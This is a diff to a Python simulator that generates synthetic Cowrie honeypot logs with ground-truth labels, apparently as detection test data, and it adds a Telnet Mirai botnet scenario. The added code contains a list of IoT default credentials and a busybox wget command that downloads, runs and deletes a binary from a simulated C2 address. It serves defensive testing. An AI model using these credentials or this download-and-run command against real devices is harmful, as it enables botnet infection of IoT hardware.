@@ -28,6 +28,7 @@ from typing import Any
 SENSOR = "hp-eastus-01"
 SENSOR_IP = "10.0.0.4"
 SENSOR_PORT = 2222
+TELNET_PORT = 2223
 START = datetime(2026, 9, 1, tzinfo=UTC)
 DAYS = 7
 
@@ -113,13 +114,15 @@ class Sim:
         sid = self.sid()
         port = self.rng.randint(32768, 60999)
         start = ts
+        dst_port = TELNET_PORT if protocol == "telnet" else SENSOR_PORT
         self.emit(ts, "cowrie.session.connect", ip, sid,
-                  f"New connection: {ip}:{port} ({SENSOR_IP}:{SENSOR_PORT}) [session: {sid}]",
-                  src_port=port, dst_ip=SENSOR_IP, dst_port=SENSOR_PORT, protocol=protocol)
+                  f"New connection: {ip}:{port} ({SENSOR_IP}:{dst_port}) [session: {sid}]",
+                  src_port=port, dst_ip=SENSOR_IP, dst_port=dst_port, protocol=protocol)
         ts += timedelta(milliseconds=self.rng.randint(80, 400))
-        self.emit(ts, "cowrie.client.version", ip, sid, f"Remote SSH version: {client}", version=client)
-        hassh = HASSHES.get(client, "ec7378c1a92f5a8dde7e8b7a1ddf33d1")
-        self.emit(ts, "cowrie.client.kex", ip, sid, f"SSH client hassh fingerprint: {hassh}", hassh=hassh)
+        if protocol == "ssh":  # Telnet has no client banner or key exchange
+            self.emit(ts, "cowrie.client.version", ip, sid, f"Remote SSH version: {client}", version=client)
+            hassh = HASSHES.get(client, "ec7378c1a92f5a8dde7e8b7a1ddf33d1")
+            self.emit(ts, "cowrie.client.kex", ip, sid, f"SSH client hassh fingerprint: {hassh}", hassh=hassh)
         for i, (user, password) in enumerate(creds):
             ts += timedelta(seconds=self.rng.uniform(0.5, gap))
             ok = success and i == len(creds) - 1
@@ -142,14 +145,15 @@ class Sim:
                   duration=duration)
         return ts
 
-    def burst(self, ip: str, start: datetime, client: str, attempts: int, creds_pool=COMMON_CREDS) -> datetime:
+    def burst(self, ip: str, start: datetime, client: str, attempts: int, creds_pool=COMMON_CREDS,
+              protocol: str = "ssh") -> datetime:
         """Brute-force burst: several short sessions with ~3 attempts each, all inside one 10-minute bin."""
         start = start.replace(minute=start.minute - start.minute % 10) + timedelta(seconds=self.rng.randint(0, 90))
         ts, done = start, 0
         while done < attempts:
             batch = min(3, attempts - done)
             creds = [self.rng.choice(creds_pool) for _ in range(batch)]
-            ts = self.session(ip, ts, client, creds, success=False, gap=2.5)
+            ts = self.session(ip, ts, client, creds, success=False, gap=2.5, protocol=protocol)
             ts += timedelta(seconds=self.rng.uniform(0.5, 3))
             done += batch
         return ts
@@ -300,6 +304,32 @@ def scanner_noise(sim: Sim) -> None:
     sim.truth[ip] = Truth("scanner_noise", "malicious", "low", "Banner grab or a few guesses; below every alert threshold.")
 
 
+IOT_CREDS = [("root", "xc3511"), ("root", "vizxv"), ("root", "888888"), ("root", "xmhdipc"), ("root", "default"),
+             ("root", "juantech"), ("root", "123456"), ("root", "54321"), ("support", "support"), ("root", "hi3518"),
+             ("admin", "admin1234"), ("root", "klv123"), ("root", "Zte521"), ("root", "7ujMko0admin"), ("guest", "12345")]
+
+
+def mirai_telnet(sim: Sim) -> None:
+    """IoT botnet over Telnet: default-credential spray, busybox probe, multi-arch loader. One shared C2."""
+    ip = sim.public_ip()
+    c2 = sim.infra("telnet_mirai.c2", sim.server_ip)
+    ts = sim.burst(ip, sim.random_time(), "", sim.rng.randint(22, 28), creds_pool=IOT_CREDS, protocol="telnet")
+    arch = sim.rng.choice(["arm7", "mips", "mpsl"])
+    probe = "".join(sim.rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(5))
+    commands = [
+        "enable", "system", "shell", "sh",
+        f"/bin/busybox {probe}",
+        "cat /proc/mounts; /bin/busybox " + probe,
+        f"cd /tmp || cd /var/run || cd /mnt; /bin/busybox wget http://{c2}/bins/hiddenbin.{arch} -O .h; "
+        f"chmod 777 .h; ./.h telnet.{arch}; rm -rf .h",
+    ]
+    sim.session(ip, ts + timedelta(seconds=5), "", [("root", "xc3511")], success=True, commands=commands,
+                downloads=[f"http://{c2}/bins/hiddenbin.{arch}"], protocol="telnet")
+    sim.truth[ip] = Truth("mirai_telnet", "malicious", "high",
+                          "IoT botnet bot over Telnet: sprayed camera/DVR default credentials, probed busybox, "
+                          "then fetched and ran a Mirai build for its CPU from the campaign's C2.")
+
+
 SCENARIOS: dict[str, tuple[Callable[[Sim], None], int]] = {
     "bruteforce_only": (bruteforce_only, 6),
     "bruteforce_success_recon": (bruteforce_success_recon, 3),
@@ -312,6 +342,8 @@ SCENARIOS: dict[str, tuple[Callable[[Sim], None], int]] = {
     "internal_vuln_scan": (internal_vuln_scan, 1),
     "internal_lateral": (internal_lateral, 1),
     "scanner_noise": (scanner_noise, 15),
+    # Appended last so the random stream - and every alert id - of the scenarios above is unchanged.
+    "mirai_telnet": (mirai_telnet, 3),
 }
 
 
